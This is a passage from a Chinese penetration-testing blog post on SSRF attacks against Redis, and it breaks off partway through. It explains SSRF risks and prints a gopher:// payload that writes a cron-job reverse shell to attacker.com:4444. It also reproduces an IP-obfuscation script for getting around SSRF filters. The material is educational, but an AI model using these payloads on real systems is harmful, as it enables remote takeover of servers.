    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">五月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">三月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">11</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/02/"><span class="card-archive-list-date">二月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/01/"><span class="card-archive-list-date">一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">十一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">十月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/09/"><span class="card-archive-list-date">九月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>漏洞复现</span></a><a class="article-meta__tags" href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>中间件</span></a><a class="article-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>网络安全</span></a><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>渗透测试</span></a><a class="article-meta__tags" href="/tags/RCE/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>RCE</span></a></span></div></div><h1 class="post-title" itemprop="name headline">SSRF-Redis专题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-03-21T16:00:00.000Z" title="发表于 2024-03-22 00:00:00">2024-03-22</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-05-22T12:29:38.712Z" title="更新于 2025-05-22 20:29:38">2025-05-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">5.2k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>21分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="SSRF-Redis专题"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长安"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长安</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="/img/default_cover.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div class="post-ai-description"><div class="ai-title"><i class="anzhiyufont anzhiyu-icon-bilibili"></i><div class="ai-title-text">AI-摘要</div><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i><i class="anzhiyufont anzhiyu-icon-circle-dot" title="朗读摘要"></i><div id="ai-tag">GPT-4.0-turbo GPT</div></div><div class="ai-explanation">AI初始化中...</div><div class="ai-btn-box"><div class="ai-btn-item">介绍自己 🙈</div><div class="ai-btn-item">生成本文简介 👋</div><div class="ai-btn-item">推荐相关文章 📖</div><div class="ai-btn-item">前往主页 🏠</div><div class="ai-btn-item" id="go-tianli-blog">前往爱发电购买</div></div><script data-pjax src="/js/anzhiyu/ai_abstract.js"></script></div><article class="post-content" id="article-container" itemscope itemtype="https://blog.takake.com/posts/56723/"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" tabindex="-1" itemprop="url">漏洞复现</a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" tabindex="-1" itemprop="url">中间件</a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">网络安全</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url">渗透测试</a><a href="/tags/RCE/" tabindex="-1" itemprop="url">RCE</a><h1 id="CrawlerTitle" itemprop="name headline">SSRF-Redis专题</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Takake</span><time itemprop="dateCreated datePublished" datetime="2024-03-21T16:00:00.000Z" title="发表于 2024-03-22 00:00:00">2024-03-22</time><time itemprop="dateCreated datePublished" datetime="2025-05-22T12:29:38.712Z" title="更新于 2025-05-22 20:29:38">2025-05-22</time></header><h2 id="SSRF漏洞详解"><a href="#SSRF漏洞详解" class="headerlink" title="SSRF漏洞详解"></a>SSRF漏洞详解</h2><p>以下是关于 <strong>SSRF（Server-Side Request Forgery，服务端请求伪造）</strong> 漏洞的详细解析，涵盖原理、危害、利用场景、防御方法等内容。</p>
<hr>
<h3 id="一、SSRF-漏洞基础概念"><a href="#一、SSRF-漏洞基础概念" class="headerlink" title="一、SSRF 漏洞基础概念"></a>一、SSRF 漏洞基础概念</h3><p><strong>定义</strong>：<br>SSRF 是一种攻击者通过构造恶意请求，<strong>诱导服务器端发起非预期的网络请求</strong>的漏洞。攻击目标通常是服务器本身或内网资源，利用服务器作为“代理”访问受限资源。</p>
<p><strong>核心问题</strong>：<br>服务器未对用户输入的 URL 或参数进行严格校验，直接用于发起网络请求（如 HTTP、FTP、Redis 协议等）。</p>
<hr>
<h3 id="二、SSRF-攻击原理"><a href="#二、SSRF-攻击原理" class="headerlink" title="二、SSRF 攻击原理"></a>二、SSRF 攻击原理</h3><ol>
<li><p><strong>攻击流程</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者构造恶意请求 → 服务器接收请求 → 服务器发起非预期请求 → 访问敏感资源或服务</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>常见触发点</strong>  </p>
<ul>
<li>用户输入 URL 参数（如图片下载、网页抓取、API 调用）。</li>
<li>服务器功能依赖外部资源（如 OAuth 授权、XML 解析）。</li>
<li>云服务元数据接口（如 AWS&#x2F;Aliyun 的 <code>169.254.169.254</code>）。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="三、SSRF-的危害场景"><a href="#三、SSRF-的危害场景" class="headerlink" title="三、SSRF 的危害场景"></a>三、SSRF 的危害场景</h3><ol>
<li><p><strong>访问内网服务</strong>  </p>
<ul>
<li>扫描内网端口和服务（如 Redis、MySQL、Consul 等未授权服务）。</li>
<li>攻击本地服务（如 <code>http://127.0.0.1:8080/admin</code>）。</li>
</ul>
</li>
<li><p><strong>读取敏感文件</strong>  </p>
<ul>
<li>利用 <code>file://</code> 协议读取服务器本地文件（如 <code>/etc/passwd</code>）。</li>
</ul>
</li>
<li><p><strong>攻击云元数据</strong>  </p>
<ul>
<li>获取云服务器临时凭证（如 AWS EC2 的 IAM 角色密钥）。</li>
</ul>
</li>
<li><p><strong>协议滥用</strong>  </p>
<ul>
<li>使用 <code>gopher://</code>、<code>dict://</code> 等协议与内网服务交互（如 Redis 未授权执行命令）。</li>
</ul>
</li>
<li><p><strong>反射型攻击</strong>  </p>
<ul>
<li>将服务器作为跳板发起 DDoS 或钓鱼攻击。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="四、SSRF-漏洞利用方式"><a href="#四、SSRF-漏洞利用方式" class="headerlink" title="四、SSRF 漏洞利用方式"></a>四、SSRF 漏洞利用方式</h3><h4 id="1-基础利用示例"><a href="#1-基础利用示例" class="headerlink" title="1. 基础利用示例"></a>1. 基础利用示例</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/download?url=http://attacker.com/malicious.jpg</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable.com</span><br></pre></td></tr></table></figure>
<p>服务器访问 <code>http://attacker.com/malicious.jpg</code>，可能触发攻击者控制的逻辑。</p>
<ul>
<li><strong>协议利用</strong></li>
</ul>
<p>​	使用 <code>file://</code>、<code>gopher://</code>、<code>dict://</code> 、<code>tftp://</code>、<code>ldap://</code>等协议：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 需要allow_url_fopen=On</span></span><br><span class="line">file:<span class="comment">///etc/passwd</span></span><br><span class="line"></span><br><span class="line">gopher:<span class="comment">//127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0aconfig set dir /var/spool/cron/%0d%0aconfig set dbfilename root%0d%0asave%0d%0a</span></span><br><span class="line"></span><br><span class="line">dict:<span class="comment">//127.0.0.1:6379/info</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250323015246258.png?x-oss-process=style/img-to-webp" alt="image-20250323015246258"></p>
<h4 id="2-高级利用技巧ByPass"><a href="#2-高级利用技巧ByPass" class="headerlink" title="2. 高级利用技巧ByPass"></a>2. 高级利用技巧ByPass</h4><h5 id="1-进制编码绕过"><a href="#1-进制编码绕过" class="headerlink" title="1.进制编码绕过"></a>1.<strong>进制编码绕过</strong></h5><p>利用工具<a target="_blank" rel="noopener" href="https://github.com/vysecurity/IPFuscator">IPFuscator</a>生成多种进制地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re, random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__version__ = <span class="string">&#x27;0.1.0&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_args</span>():</span><br><span class="line">	parser = ArgumentParser()</span><br><span class="line">	parser.add_argument(<span class="string">&#x27;ip&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;The IP to perform IPFuscation on&#x27;</span>)</span><br><span class="line">	parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Output file&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;IPFuscator&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Author: Vincent Yiu (@vysecurity)&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;https://www.github.com/vysec/IPFuscator&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Version: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(__version__))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkIP</span>(<span class="params">ip</span>):</span><br><span class="line">	m = re.<span class="keyword">match</span>(<span class="string">&#x27;\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\Z&#x27;</span>,ip)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> m:</span><br><span class="line">		<span class="comment"># Valid IP format</span></span><br><span class="line">		parts = ip.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(parts) == <span class="number">4</span>:</span><br><span class="line">			<span class="comment"># Valid IP</span></span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> parts:</span><br><span class="line">					<span class="keyword">if</span> <span class="built_in">int</span>(i) &gt; <span class="number">255</span> <span class="keyword">or</span> <span class="built_in">int</span>(i) &lt; <span class="number">0</span>:</span><br><span class="line">						<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			 <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printOutput</span>(<span class="params">ip</span>):</span><br><span class="line">	parts = ip.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	decimal = <span class="built_in">int</span>(parts[<span class="number">0</span>]) * <span class="number">16777216</span> + <span class="built_in">int</span>(parts[<span class="number">1</span>]) * <span class="number">65536</span> + <span class="built_in">int</span>(parts[<span class="number">2</span>]) * <span class="number">256</span> + <span class="built_in">int</span>(parts[<span class="number">3</span>])</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Decimal:\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(decimal))</span><br><span class="line">	<span class="comment">#hexadecimal = &quot;0x%02X%02X%02X%02X&quot; % (int(parts[0]), int(parts[1]), int(parts[2]), int(parts[3]))</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Hexadecimal:\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(decimal)))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#octal = oct(decimal)</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Octal:\t\t0&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">oct</span>(decimal)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">	hexparts = []</span><br><span class="line">	octparts = []</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> parts:</span><br><span class="line">		hexparts.append(<span class="built_in">hex</span>(<span class="built_in">int</span>(i)))</span><br><span class="line">		octparts.append(<span class="string">&quot;0&quot;</span> + <span class="built_in">oct</span>(<span class="built_in">int</span>(i))[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Full Hex:\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;.&#x27;</span>.join(hexparts)))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Full Oct:\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;.&#x27;</span>.join(octparts)))</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Random Padding: &quot;</span>)</span><br><span class="line"></span><br><span class="line">	randhex = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> hexparts:</span><br><span class="line">		randhex += i.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;0&#x27;</span> * random.randint(<span class="number">1</span>,<span class="number">30</span>)) + <span class="string">&#x27;.&#x27;</span></span><br><span class="line"></span><br><span class="line">	randhex = randhex[:-<span class="number">1</span>]</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Hex:\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(randhex))</span><br><span class="line"></span><br><span class="line">	randoct = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> octparts:</span><br><span class="line">		randoct += <span class="string">&#x27;0&#x27;</span> * random.randint(<span class="number">1</span>,<span class="number">30</span>) + i + <span class="string">&#x27;.&#x27;</span></span><br><span class="line"></span><br><span class="line">	randoct = randoct[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Oct:\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(randoct))</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Random base:&quot;</span>)</span><br><span class="line"></span><br><span class="line">	randbase = []</span><br><span class="line"></span><br><span class="line">	count = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">		randbaseval = <span class="string">&quot;&quot;</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">			val = random.randint(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">			<span class="keyword">if</span> val == <span class="number">0</span>:</span><br><span class="line">				<span class="comment"># dec</span></span><br><span class="line">				randbaseval += parts[i] + <span class="string">&#x27;.&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> val == <span class="number">1</span>:</span><br><span class="line">				<span class="comment"># hex</span></span><br><span class="line">				randbaseval += hexparts[i] + <span class="string">&#x27;.&#x27;</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				randbaseval += octparts[i] + <span class="string">&#x27;.&#x27;</span></span><br><span class="line">				<span class="comment"># oct</span></span><br><span class="line">		randbase.append(randbaseval[:-<span class="number">1</span>])</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;#&#123;&#125;:\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(count+<span class="number">1</span>, randbase[count]))</span><br><span class="line">		count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Random base with random padding:&quot;</span>)</span><br><span class="line"></span><br><span class="line">	randbase = []</span><br><span class="line"></span><br><span class="line">	count = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">		randbaseval = <span class="string">&quot;&quot;</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">			val = random.randint(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">			<span class="keyword">if</span> val == <span class="number">0</span>:</span><br><span class="line">				<span class="comment"># dec</span></span><br><span class="line">				randbaseval += parts[i] + <span class="string">&#x27;.&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> val == <span class="number">1</span>:</span><br><span class="line">				<span class="comment"># hex</span></span><br><span class="line">				randbaseval += hexparts[i].replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;0&#x27;</span> * random.randint(<span class="number">1</span>,<span class="number">30</span>)) + <span class="string">&#x27;.&#x27;</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				randbaseval += <span class="string">&#x27;0&#x27;</span> * random.randint(<span class="number">1</span>,<span class="number">30</span>) + octparts[i] + <span class="string">&#x27;.&#x27;</span></span><br><span class="line">				<span class="comment"># oct</span></span><br><span class="line">		randbase.append(randbaseval[:-<span class="number">1</span>])</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;#&#123;&#125;:\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(count+<span class="number">1</span>, randbase[count]))</span><br><span class="line">		count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">	banner()</span><br><span class="line"></span><br><span class="line">	args = get_args()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> checkIP(args.ip):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;IP Address:\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(args.ip))</span><br><span class="line">		printOutput(args.ip)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!] Invalid IP format: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(args.ip))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>

<p>​	使用方式，每一个都可以进行尝试</p>
<p>​	<code>python IPFuscator.py 192.168.100.1</code></p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">IPFuscator</span><br><span class="line">Author: Vincent Yiu (@vysecurity)</span><br><span class="line">https://www.github.com/vysec/IPFuscator</span><br><span class="line">Version: 0.1.0</span><br><span class="line"></span><br><span class="line">IP Address:     192.168.100.1</span><br><span class="line"></span><br><span class="line">Decimal:        3232261121</span><br><span class="line">Hexadecimal:    0xc0a86401</span><br><span class="line">Octal:          030052062001</span><br><span class="line"></span><br><span class="line">Full Hex:       0xc0.0xa8.0x64.0x1</span><br><span class="line">Full Oct:       0300.0250.0144.01</span><br><span class="line"></span><br><span class="line">Random Padding: </span><br><span class="line">Hex:    0x00c0.0x00000000a8.0x000000000064.0x00000001</span><br><span class="line">Oct:    0000000000000000300.000000000000000000000000000000250.00000000000000000000000000144.0000000000000000000000000001</span><br><span class="line"></span><br><span 